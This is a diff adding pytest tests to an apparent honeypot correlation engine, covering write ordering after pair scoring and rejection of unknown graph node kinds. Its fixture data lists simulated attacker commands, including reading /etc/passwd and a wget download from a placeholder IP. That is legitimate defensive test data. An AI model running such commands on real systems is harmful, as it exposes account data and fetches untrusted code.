@@ -121,6 +121,55 @@ def _campaigns(client, headers):
     return response.json()["items"]
 
 
+def test_session_nodes_are_written_after_pair_scoring(
+    client, sensor_headers, admin_headers, monkeypatch
+):
+    """Pair scoring must finish before the first write opens a transaction.
+
+    A correlation run used to upsert session nodes before the quadratic
+    comparison.  That held the SQLite write lock for the whole run, blocking
+    ingestion and sign-in audits, and could fail to upgrade a stale snapshot
+    when another process wrote in the meantime.
+    """
+    from app.correlation import engine
+
+    commands = ["uname -a", "cat /etc/passwd", "wget http://198.51.100.9/x"]
+    for index, ip in enumerate(("203.0.113.211", "203.0.113.212")):
+        _ingest(
+            client,
+            sensor_headers,
+            _ssh_events(
+                session_id=f"sess-ordering-{index}",
+                ip=ip,
+                commands=commands,
+                usernames=["root"],
+                start_minutes=30 - index,
+            ),
+        )
+
+    sequence: list[str] = []
+    original_compare = engine.compare
+    original_upsert = engine._upsert_session_node
+
+    def tracked_compare(*args, **kwargs):
+        sequence.append("compare")
+        return original_compare(*args, **kwargs)
+
+    def tracked_upsert(*args, **kwargs):
+        sequence.append("write")
+        return original_upsert(*args, **kwargs)
+
+    monkeypatch.setattr(engine, "compare", tracked_compare)
+    monkeypatch.setattr(engine, "_upsert_session_node", tracked_upsert)
+
+    result = engine.correlate(window_hours=24, actor="test:ordering")
+    assert result["sessions"] == 2
+    assert "compare" in sequence and "write" in sequence
+    first_write = sequence.index("write")
+    last_compare = len(sequence) - 1 - sequence[::-1].index("compare")
+    assert last_compare < first_write
+
+
 def test_multi_ip_related_sessions_become_campaign(client, sensor_headers, admin_headers):
     commands = [
         "uname -a",
@@ -1135,3 +1184,12 @@ def test_campaign_detail_ranks_missing_evidence_and_reports_observation_cost(cli
     assert observation["sessions"] == 3
     assert observation["linked_pairs"] == 2
     assert observation["observations_per_link"] == 10.0
+
+
+def test_graph_rejects_an_unknown_node_kind(client, admin_headers):
+    """An unknown filter must fail, not silently widen to every node."""
+    response = client.get("/api/v1/graph?kinds=session,contoso", headers=admin_headers)
+    assert response.status_code == 422, response.text
+    error = response.json()["error"]
+    assert error["code"] == "validation_failed" or error["details"]["unknown"] == ["contoso"]
+    assert "contoso" in str(error)
